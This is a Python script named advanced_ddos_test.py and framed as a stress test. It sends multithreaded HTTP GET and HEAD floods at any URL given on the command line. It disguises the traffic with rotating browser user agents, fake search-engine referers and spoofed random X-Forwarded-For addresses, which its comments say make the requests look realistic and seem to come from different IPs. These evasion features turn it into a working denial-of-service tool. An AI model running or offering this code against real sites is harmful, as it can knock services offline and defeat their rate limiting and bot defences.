import requests
import threading
import time
import sys
import random
import socket
from urllib.parse import urlparse
import json
from concurrent.futures import ThreadPoolExecutor

class AdvancedDDoSTest:
    def __init__(self, url, threads=50, requests_per_thread=1000):
        self.url = url
        self.threads = threads
        self.requests_per_thread = requests_per_thread
        self.success_count = 0
        self.error_count = 0
        self.start_time = None
        self.lock = threading.Lock()
        
        # Validate URL format
        parsed = urlparse(url)
        if not parsed.scheme or not parsed.netloc:
            print("Invalid URL format. Please include http:// or https://")
            sys.exit(1)
        
        # Check if the server is reachable before starting the test
        self.check_server_reachable()
    
    def check_server_reachable(self):
        parsed = urlparse(self.url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        
        print(f"Checking if server at {host}:{port} is reachable...")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((host, port))
            sock.close()
            
            if result != 0:
                print(f"ERROR: Server at {host}:{port} is not reachable!")
                print("Make sure your server is running and accessible from this machine.")
                sys.exit(1)
            else:
                print(f"Server at {host}:{port} is reachable. Starting test...")
        except Exception as e:
            print(f"ERROR: Failed to check server connectivity: {str(e)}")
            sys.exit(1)
    
    def get_random_headers(self):
        # List of realistic user agents
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0'
        ]
        
        # Generate random headers to make requests look more realistic
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': random.choice([
                'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
            ]),
            'Accept-Language': random.choice([
                'en-US,en;q=0.9',
                'en-GB,en;q=0.9,en-US;q=0.8',
                'en-US,en;q=0.8',
                'en-US,en;q=0.5'
            ]),
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': random.choice(['max-age=0', 'no-cache', 'no-store'])
        }
        
        # Add random referer occasionally
        if random.random() > 0.7:
            headers['Referer'] = random.choice([
                'https://www.google.com/',
                'https://www.bing.com/',
                'https://duckduckgo.com/',
                'https://www.reddit.com/',
                'https://twitter.com/'
            ])
        
        return headers
    
    def get_random_ip(self):
        # Generate a random IP address for X-Forwarded-For header
        return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    
    def send_request(self):
        session = requests.Session()
        
        for _ in range(self.requests_per_thread):
            try:
                # Random delay between requests to mimic human behavior
                time.sleep(random.uniform(0.05, 0.3))
                
                headers = self.get_random_headers()
                
                # Add X-Forwarded-For header to simulate different IPs
                headers['X-Forwarded-For'] = self.get_random_ip()
                
                # Randomly choose request method
                method = random.choice(['GET', 'HEAD'])
                
                if method == 'GET':
                    response = session.get(
                        self.url,
                        headers=headers,
                        timeout=10,
                        verify=False if self.url.startswith('https://192.168') or self.url.startswith('https://10.') else True,
                        allow_redirects=True
                    )
                else:  # HEAD
                    response = session.head(
                        self.url,
                        headers=headers,
                        timeout=10,
                        verify=False if self.url.startswith('https://192.168') or self.url.startswith('https://10.') else True,
                        allow_redirects=True
                    )
                
                with self.lock:
                    if response.status_code < 400:
                        self.success_count += 1
                        print(f"Success: {response.status_code}")
                    else:
                        self.error_count += 1
                        print(f"Error: {response.status_code} - {response.reason}")
            except requests.exceptions.RequestException as e:
                with self.lock:
                    self.error_count += 1
                    print(f"Exception: {str(e)}")
    
    def run_test(self):
        self.start_time = time.time()
        
        print(f"Starting advanced stress test on {self.url}")
        print(f"Using {self.threads} threads with {self.requests_per_thread} requests per thread")
        print(f"Total expected requests: {self.threads * self.requests_per_thread}")
        
        # Use ThreadPoolExecutor for better thread management
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for _ in range(self.threads):
                executor.submit(self.send_request)
        
        elapsed_time = time.time() - self.start_time
        total_requests = self.threads * self.requests_per_thread
        
        print("\nTest Results:")
        print(f"Total requests sent: {total_requests}")
        print(f"Successful responses: {self.success_count}")
        print(f"Failed requests: {self.error_count}")
        print(f"Test duration: {elapsed_time:.2f} seconds")
        print(f"Requests per second: {total_requests/elapsed_time:.2f}")
        
        # Calculate success rate
        success_rate = (self.success_count / total_requests) * 100 if total_requests > 0 else 0
        print(f"Success rate: {success_rate:.2f}%")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python advanced_ddos_test.py <URL> [threads] [requests_per_thread]")
        print("Example: python advanced_ddos_test.py https://yourwebsite.com 100 20")
        sys.exit(1)
    
    url = sys.argv[1]
    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 100
    requests_per_thread = int(sys.argv[3]) if len(sys.argv) > 3 else 20
    
    test = AdvancedDDoSTest(url, threads, requests_per_thread)
    test.run_test()